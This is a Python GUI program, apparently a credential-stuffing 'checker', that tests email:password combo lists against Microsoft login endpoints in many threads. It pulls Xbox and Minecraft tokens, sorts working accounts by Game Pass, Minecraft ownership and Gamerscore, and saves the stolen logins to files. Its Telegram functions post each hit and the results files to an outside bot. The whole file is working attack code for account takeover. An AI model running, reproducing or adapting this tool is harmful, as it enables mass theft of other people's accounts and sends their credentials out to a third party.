# -*- coding: utf-8 -*-
"""
XBOX + MINECRAFT CHECKER - @llljjv (FIXED VERSION)
"""

import os
import sys
import time
import requests
import re
import threading
import queue
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from urllib.parse import urlparse, parse_qs
import urllib3
import concurrent.futures
from requests.adapters import HTTPAdapter
from datetime import datetime

urllib3.disable_warnings()

# =================== GLOBALS ===================
GRAY = "\033[1;90m"
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
CYAN = "\033[1;96m"
MAGENTA = "\033[1;35m"
WHITE = "\033[1;97m"
RESET = "\033[0m"
LINE = GRAY + "-------------------------------------------------------------------" + RESET

BOT_TOKEN = ""
CHAT_ID = ""

checked = 0
total_combos = 0
hits = 0
bad = 0
twofa = 0
errors = 0
gamepass_count = 0
minecraft_count = 0
gscore_count = 0
start_time = 0
is_running = True
account_counter = 0
account_counter_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()

gamepass_accounts = []
minecraft_accounts = []
gscore_accounts = []

DELAY_BETWEEN_CHECKS = 2
REQUEST_TIMEOUT = 25

# =================== TELEGRAM ===================
def send_telegram_hit(content):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": f"🔥 *NEW XBOX HIT FOUND!*\n\n{content}", "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_telegram_file(filepath, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=20)
    except:
        pass

# =================== FILE HELPERS ===================
def setup_folders():
    if not os.path.exists("XBOX_RESULT"):
        os.makedirs("XBOX_RESULT")
    if not os.path.exists("Hathoun"):
        os.makedirs("Hathoun")

def get_next_file_number(base_name):
    existing_files = os.listdir("XBOX_RESULT")
    pattern = re.compile(rf'{re.escape(base_name)}-(\d+)\.txt$')
    max_num = 0
    for file in existing_files:
        match = pattern.match(file)
        if match:
            num = int(match.group(1))
            if num > max_num:
                max_num = num
    return max_num + 1

def extract_email_from_content(content):
    email_match = re.search(r'Email: (.+?)\n', content)
    if email_match:
        return email_match.group(1).strip()
    return None

def load_hathoun_database():
    hathoun_emails = set()
    hathoun_files = ["Hathoun-GamePass.txt", "Hathoun-Minecraft.txt", "Hathoun-GScore.txt"]
    for filename in hathoun_files:
        filepath = os.path.join("Hathoun", filename)
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                    emails = re.findall(r'Email: (.+?)\n', content)
                    hathoun_emails.update(emails)
            except Exception as e:
                print(f"Error loading {filename}: {e}")
    return hathoun_emails

def remove_duplicates(accounts):
    unique_accounts = {}
    for acc in accounts:
        email = extract_email_from_content(acc['content'])
        if email:
            if email not in unique_accounts:
                unique_accounts[email] = acc
            else:
                if acc['gscore'] > unique_accounts[email]['gscore']:
                    unique_accounts[email] = acc
    return list(unique_accounts.values())

def save_accounts_to_file(accounts, filepath):
    if not accounts:
        return 0
    accounts = remove_duplicates(accounts)
    accounts.sort(key=lambda x: x['gscore'], reverse=True)
    for idx, acc in enumerate(accounts, 1):
        acc['content'] = re.sub(r'Account number: \d+', f'Account number: {idx}', acc['content'])
    with open(filepath, 'w', encoding='utf-8') as f:
        for acc in accounts:
            f.write(acc['content'] + '\n')
    return len(accounts)

def load_existing_accounts(filename):
    accounts = []
    filepath = os.path.join("XBOX_RESULT", filename)
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
                raw_accounts = content.split('_________________________________________________________')
                for raw_acc in raw_accounts:
                    if raw_acc.strip():
                        gscore_match = re.search(r'Gamerscore: (\d+)', raw_acc)
                        if gscore_match:
                            gscore = int(gscore_match.group(1))
                            accounts.append({'content': raw_acc.strip(), 'gscore': gscore})
        except Exception as e:
            print(f"Error loading {filename}: {e}")
    return accounts

def add_account_to_list(account_type, content, gscore):
    global gamepass_accounts, minecraft_accounts, gscore_accounts
    account_data = {'content': content, 'gscore': gscore}
    if account_type == 'gamepass':
        gamepass_accounts.append(account_data)
    elif account_type == 'minecraft':
        minecraft_accounts.append(account_data)
    elif account_type == 'gscore':
        gscore_accounts.append(account_data)
    send_telegram_hit(content)

# =================== FIXED LOGIN FLOW ===================

def extract_ppft(text):
    """Extract PPFT token from login page - multiple patterns"""
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
        r'value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"',
        r'value=\"([^\"]+)\"[^>]*name=\"PPFT\"',
        r'name=\"PPFT\"[^>]*value=\"([^\"]+)\"',
        r'value="([^"]+)"[^>]*id="i0327"',
        r'"sFTTag":".*?value=\\"([^\\"]+)\\"',
        r'"sFTTag":"<input[^>]*value="([^"]+)"',
        r'<input[^>]*name="PPFT"[^>]*value="([^"]+)"',
        r'<input[^>]*value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT"\s*:\s*"([^"]+)"',
        r'value=\\"([^\\"]+)\\"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    """Extract post URL from login page"""
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'"urlPost":\s*"([^"]+)"',
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
        r'"post_url":"([^"]+)"',
        r'"urlPost":"([^"]+)"',
        r'urlPost:\s*"([^"]+)"',
        r'"loginUrl":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def check_account(combo):
    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter

    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock:
            bad += 1
            checked += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)

    for attempt in range(3):
        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        })

        try:
            sftag_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch"
                "&response_type=token"
                "&locale=en"
            )
            resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
            text = resp.text

            sftag = extract_ppft(text)
            url_post = extract_url_post(text)

            if not sftag or not url_post:
                with stats_lock:
                    bad += 1
                    checked += 1
                session.close()
                return

            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
                'i19': '0',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': sftag_url,
                'Origin': 'https://login.live.com',
            }
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)

            ms_token = None
            login_text = login_req.text.lower()
            login_url = login_req.url.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif 'access_token' in login_text:
                token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
                if token_match:
                    ms_token = token_match.group(1)
            elif 'window.location.replace' in login_text:
                loc_match = re.search(r'window\.location\.replace\(["\']([^"\']+)["\']\)', login_text)
                if loc_match:
                    redirect_url = loc_match.group(1)
                    if 'access_token' in redirect_url:
                        ms_token = parse_qs(urlparse(redirect_url).fragment).get('access_token', [None])[0]
                        if not ms_token:
                            ms_token = parse_qs(urlparse(redirect_url).query).get('access_token', [None])[0]
            elif 'location.href' in login_text:
                loc_match = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', login_text)
                if loc_match:
                    redirect_url = loc_match.group(1)
                    if 'access_token' in redirect_url:
                        ms_token = parse_qs(urlparse(redirect_url).fragment).get('access_token', [None])[0]
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect", "account or password is incorrect", "sign in to your microsoft account"]):
                with stats_lock:
                    bad += 1
                    checked += 1
                session.close()
                return
            elif any(x in login_text for x in ["recover", "account.live.com/identity/confirm", "email/confirm", "abuse", "locked", "help us protect", "verify your identity", "security challenge", "two-step", "additional security"]):
                with stats_lock:
                    twofa += 1
                    checked += 1
                session.close()
                return
            elif 'cancel?mkt=' in login_text or 'kmsi' in login_text or 'id="idBtn_Back"' in login_text or 'stay signed in' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text)
                    if not action_match:
                        action_match = re.search(r'action="([^"]+)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {
                            'ipt': ipt_match.group(1),
                            'pprid': pprid_match.group(1),
                            'uaid': uaid_match.group(1),
                            'LoginOptions': '3',
                            'type': '11',
                        }
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        if 'access_token' in ret.url:
                            ms_token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                        else:
                            return_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
                            if return_url:
                                fin = session.get(return_url.group(1), allow_redirects=True, timeout=REQUEST_TIMEOUT)
                                if 'access_token' in fin.url:
                                    ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except:
                    pass
            elif 'terms of use' in login_text or ('accept' in login_text and 'terms' in login_text):
                try:
                    action = re.search(r'<form[^>]*action="([^"]+)"', login_req.text)
                    if action:
                        form_data = {}
                        for m in re.finditer(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', login_req.text):
                            form_data[m.group(1)] = m.group(2)
                        form_data['iAccpet'] = '1'
                        terms_resp = session.post(action.group(1), data=form_data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        if 'access_token' in terms_resp.url:
                            ms_token = parse_qs(urlparse(terms_resp.url).fragment).get('access_token', [None])[0]
                except:
                    pass

            if not ms_token:
                with stats_lock:
                    bad += 1
                    checked += 1
                session.close()
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)

            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamertag = "N/A"
            gamerscore = "0"
            gscore_int = 0

            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': 
                                gamerscore = s['value']
                                try:
                                    gscore_int = int(gamerscore)
                                except:
                                    gscore_int = 0
            except:
                pass

            has_gp = False
            has_mc = False
            gp_type = ""
            mc_ent_text = ""

            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
                                           headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                            if ent_req.status_code == 200:
                                mc_ent_text = ent_req.text
            except:
                pass

            if 'product_game_pass_ultimate' in mc_ent_text:
                gp_type = "Game Pass Ultimate"
                has_gp = True
            elif 'product_game_pass_pc' in mc_ent_text:
                gp_type = "PC Game Pass"
                has_gp = True
            elif 'product_game_pass_console' in mc_ent_text:
                gp_type = "Xbox Game Pass Console"
                has_gp = True

            has_mc = 'product_minecraft' in mc_ent_text

            with account_counter_lock:
                account_counter += 1
                current_num = account_counter

            hit_content = f"""Account number: {current_num}
Email: {email}
Password: {password}
Gamertag: {gamertag}
Gamerscore: {gamerscore}
Minecraft: {'Yes' if has_mc else 'No'}
Game Pass: {gp_type if has_gp else 'No'}
_________________________________________________________"""

            with stats_lock:
                if has_gp:
                    gamepass_count += 1
                    hits += 1
                    add_account_to_list('gamepass', hit_content, gscore_int)
                    save_hit_immediately('gamepass', hit_content, gscore_int)
                elif has_mc:
                    minecraft_count += 1
                    hits += 1
                    add_account_to_list('minecraft', hit_content, gscore_int)
                    save_hit_immediately('minecraft', hit_content, gscore_int)
                elif gscore_int > 0:
                    gscore_count += 1
                    hits += 1
                    add_account_to_list('gscore', hit_content, gscore_int)
                    save_hit_immediately('gscore', hit_content, gscore_int)
                else:
                    bad += 1
                checked += 1

            time.sleep(DELAY_BETWEEN_CHECKS)
            return 

        except requests.exceptions.RequestException:
            time.sleep(1)
        except Exception:
            time.sleep(0.5)
        finally:
            if session:
                session.close()

    with stats_lock:
        errors += 1
        checked += 1

# =================== REAL-TIME FILE SAVING ===================
def save_hit_immediately(account_type, content, gscore):
    """Save hit to file immediately"""
    with file_lock:
        if account_type == 'gamepass':
            filename = "XBOX-GamePass.txt"
        elif account_type == 'minecraft':
            filename = "Minecraft-Hits.txt"
        elif account_type == 'gscore':
            filename = "G-Score-Hits.txt"
        else:
            return
        
        filepath = os.path.join("XBOX_RESULT", filename)
        existing = load_existing_accounts(filename)
        new_account = {'content': content, 'gscore': gscore}
        existing.append(new_account)
        save_accounts_to_file(existing, filepath)

# =================== GUI APPLICATION ===================
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("🔥 XBOX + MINECRAFT CHECKER")
        self.root.geometry("920x740")
        self.root.configure(bg="#0a0a0f")
        self.root.resizable(True, True)

        self.q = queue.Queue()
        self.executor = None
        self.combos = []

        self.build_ui()
        self.update_loop()

    def build_ui(self):
        mf = tk.Frame(self.root, bg="#0a0a0f")
        mf.pack(fill=tk.BOTH, expand=True, padx=12, pady=12)

        hdr = tk.Frame(mf, bg="#0a0a0f")
        hdr.pack(fill=tk.X, pady=(0, 5))
        tk.Label(hdr, text="🔥 XBOX + MINECRAFT CHECKER", font=('Consolas', 22, 'bold'),
                bg="#0a0a0f", fg="#00ff88").pack()
        tk.Label(hdr, text="iraq  |  Coded by: @llljjv", font=('Consolas', 9),
                bg="#0a0a0f", fg="#555555").pack()

        inp = tk.Frame(mf, bg="#12121f", bd=2, relief=tk.RIDGE, highlightbackground="#1e1e2e", highlightthickness=1)
        inp.pack(fill=tk.X, pady=8)

        r1 = tk.Frame(inp, bg="#12121f")
        r1.pack(fill=tk.X, padx=12, pady=(12, 6))
        tk.Label(r1, text="📁  Combo File:", bg="#12121f", fg="#00d4ff",
                font=('Consolas', 11, 'bold')).pack(side=tk.LEFT)
        self.file_entry = tk.Entry(r1, width=50, font=('Consolas', 10),
                                   bg="#0a0a0f", fg="#ffffff", insertbackground="#00ff88",
                                   relief=tk.FLAT, bd=6, highlightbackground="#1e1e2e", highlightthickness=1)
        self.file_entry.pack(side=tk.LEFT, padx=8, fill=tk.X, expand=True)
        tk.Button(r1, text="Browse", command=self.browse,
                  bg="#00d4ff", fg="#000000", font=('Consolas', 9, 'bold'),
                  relief=tk.FLAT, padx=14, cursor="hand2").pack(side=tk.LEFT)

        r2 = tk.Frame(inp, bg="#12121f")
        r2.pack(fill=tk.X, padx=12, pady=(6, 12))
        tk.Label(r2, text="🧵  Threads:", bg="#12121f", fg="#00d4ff",
                font=('Consolas', 11, 'bold')).pack(side=tk.LEFT)
        self.thr_var = tk.StringVar(value="35")
        tk.Spinbox(r2, from_=1, to=50, textvariable=self.thr_var, width=8,
                  font=('Consolas', 10), bg="#0a0a0f", fg="#ffffff",
                  relief=tk.FLAT, buttonbackground="#00d4ff").pack(side=tk.LEFT, padx=8)

        bf = tk.Frame(r2, bg="#12121f")
        bf.pack(side=tk.RIGHT)
        self.btn_start = tk.Button(bf, text="▶  START CHECK", command=self.start,
                                   bg="#00ff88", fg="#000000", font=('Consolas', 11, 'bold'),
                                   relief=tk.FLAT, padx=22, pady=6, cursor="hand2")
        self.btn_start.pack(side=tk.LEFT, padx=4)
        self.btn_stop = tk.Button(bf, text="⏹  STOP", command=self.stop,
                                  bg="#ff4757", fg="#ffffff", font=('Consolas', 11, 'bold'),
                                  relief=tk.FLAT, padx=22, pady=6, cursor="hand2", state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=4)

        sf = tk.Frame(mf, bg="#0a0a0f", bd=2, relief=tk.RIDGE, highlightbackground="#1e1e2e", highlightthickness=1)
        sf.pack(fill=tk.X, pady=8)

        tk.Label(sf, text="📊  STATISTICS", bg="#0a0a0f", fg="#ffd700",
                font=('Consolas', 13, 'bold')).pack(pady=(10, 8))

        sg = tk.Frame(sf, bg="#0a0a0f")
        sg.pack(padx=15, pady=5)

        self.st_checked = self.stat_label(sg, "✓ Checked", "0 / 0", 0, 0, "#00d4ff")
        self.st_hits   = self.stat_label(sg, "★ Hits", "0", 0, 1, "#00ff88")
        self.st_bad    = self.stat_label(sg, "✗ Bad", "0", 0, 2, "#ff4757")
        self.st_err    = self.stat_label(sg, "⚠ Errors", "0", 1, 0, "#ffa502")
        self.st_2fa    = self.stat_label(sg, "🔒 2FA", "0", 1, 1, "#ff6b81")
        self.st_cpm    = self.stat_label(sg, "⚡ CPM", "0", 1, 2, "#e056fd")
        self.st_gp     = self.stat_label(sg, "🎮 Game Pass", "0", 2, 0, "#7bed9f")
        self.st_mc     = self.stat_label(sg, "⛏️ Minecraft", "0", 2, 1, "#70a1ff")
        self.st_gs     = self.stat_label(sg, "🏆 G-Score", "0", 2, 2, "#ff7f50")

        self.prog = ttk.Progressbar(sf, length=860, mode='determinate')
        self.prog.pack(pady=(8, 4), padx=15)
        self.prog_lbl = tk.Label(sf, text="0.0%", bg="#0a0a0f", fg="#00ff88",
                                font=('Consolas', 11, 'bold'))
        self.prog_lbl.pack(pady=(0, 8))

        lf = tk.Frame(mf, bg="#0a0a0f")
        lf.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        tk.Label(lf, text="📋  Live Logs", bg="#0a0a0f", fg="#ffd700",
                font=('Consolas', 11, 'bold')).pack(anchor="w", pady=(0, 4))

        tf = tk.Frame(lf, bg="#0a0a0f", bd=2, relief=tk.RIDGE, highlightbackground="#1e1e2e", highlightthickness=1)
        tf.pack(fill=tk.BOTH, expand=True)
        sb = tk.Scrollbar(tf)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.logs = tk.Text(tf, height=10, bg="#0a0a0f", fg="#cccccc",
                            font=('Consolas', 9), relief=tk.FLAT, bd=8,
                            yscrollcommand=sb.set, state=tk.DISABLED, wrap=tk.WORD,
                            highlightthickness=0)
        self.logs.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sb.config(command=self.logs.yview)

        self.status = tk.Label(mf, text="Ready", bd=1, relief=tk.SUNKEN,
                              anchor=tk.W, bg="#12121f", fg="#00ff88",
                              font=('Consolas', 9))
        self.status.pack(fill=tk.X, pady=(8, 0))

    def stat_label(self, parent, title, val, r, c, color):
        f = tk.Frame(parent, bg="#0a0a0f", padx=8, pady=4)
        f.grid(row=r, column=c, padx=18, pady=4, sticky="w")
        tk.Label(f, text=title, bg="#0a0a0f", fg="#666666",
                font=('Consolas', 10)).pack(side=tk.LEFT)
        lbl = tk.Label(f, text=val, bg="#0a0a0f", fg=color,
                       font=('Consolas', 11, 'bold'))
        lbl.pack(side=tk.LEFT, padx=(8, 0))
        return lbl

    def browse(self):
        fp = filedialog.askopenfilename(title="Select Combo File",
                                        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if fp:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, fp)

    def log(self, msg, tag="info"):
        self.logs.config(state=tk.NORMAL)
        ts = datetime.now().strftime("%H:%M:%S")
        colors = {
            "info": "#cccccc", "hit": "#00ff88", "bad": "#ff4757",
            "error": "#ff6b81", "twofa": "#ffa502",
            "gamepass": "#7bed9f", "minecraft": "#70a1ff", "gscore": "#ff7f50"
        }
        self.logs.insert(tk.END, f"[{ts}] ", "ts")
        self.logs.insert(tk.END, f"{msg}\n", tag)
        self.logs.tag_config("ts", foreground="#444444")
        self.logs.tag_config(tag, foreground=colors.get(tag, "#cccccc"))
        self.logs.see(tk.END)
        self.logs.config(state=tk.DISABLED)

    def update_stats(self):
        global checked, total_combos, hits, bad, twofa, errors
        global gamepass_count, minecraft_count, gscore_count, start_time

        with stats_lock:
            self.st_checked.config(text=f"{checked} / {total_combos}")
            self.st_hits.config(text=str(hits))
            self.st_bad.config(text=str(bad))
            self.st_err.config(text=str(errors))
            self.st_2fa.config(text=str(twofa))
            self.st_gp.config(text=str(gamepass_count))
            self.st_mc.config(text=str(minecraft_count))
            self.st_gs.config(text=str(gscore_count))

            elapsed = time.time() - start_time if start_time else 0
            cpm = int((checked / elapsed) * 60) if elapsed > 2 else 0
            self.st_cpm.config(text=str(cpm))

            if total_combos > 0:
                pct = (checked / total_combos) * 100
                self.prog['value'] = pct
                self.prog_lbl.config(text=f"{pct:.1f}%")

    def update_loop(self):
        self.update_stats()
        try:
            while True:
                msg = self.q.get_nowait()
                t = msg.get('type')
                if t == 'done':
                    self.finished()
                elif t == 'log':
                    self.log(msg.get('text', ''), msg.get('tag', 'info'))
        except queue.Empty:
            pass
        self.root.after(50, self.update_loop)

    def start(self):
        global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count
        global total_combos, start_time, is_running, account_counter

        fp = self.file_entry.get().strip()
        if not fp or not os.path.exists(fp):
            messagebox.showerror("Error", "Please select a valid combo file!")
            return
        try:
            thr = int(self.thr_var.get())
            if not (1 <= thr <= 50):
                raise ValueError
        except:
            messagebox.showerror("Error", "Threads must be 1-50!")
            return

        try:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                self.combos = [line.strip() for line in f if line.strip() and ':' in line]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {e}")
            return

        total_combos = len(self.combos)
        if total_combos == 0:
            messagebox.showerror("Error", "The combo file is empty or invalid!")
            return

        checked = 0
        hits = 0
        bad = 0
        twofa = 0
        errors = 0
        gamepass_count = 0
        minecraft_count = 0
        gscore_count = 0
        account_counter = 0
        start_time = time.time()
        is_running = True

        setup_folders()

        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.status.config(text="Checking in progress...")

        threading.Thread(target=self.run_checker, args=(thr,), daemon=True).start()

    def run_checker(self, threads):
        global is_running
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_account, combo) for combo in self.combos]
            for future in concurrent.futures.as_completed(futures):
                if not is_running:
                    break
        self.q.put({'type': 'done'})

    def stop(self):
        global is_running
        is_running = False
        self.status.config(text="Stopping...")

    def finished(self):
        global is_running
        is_running = False
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.status.config(text="Finished checking!")
        messagebox.showinfo("Done", "Checking process has completed successfully!")

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
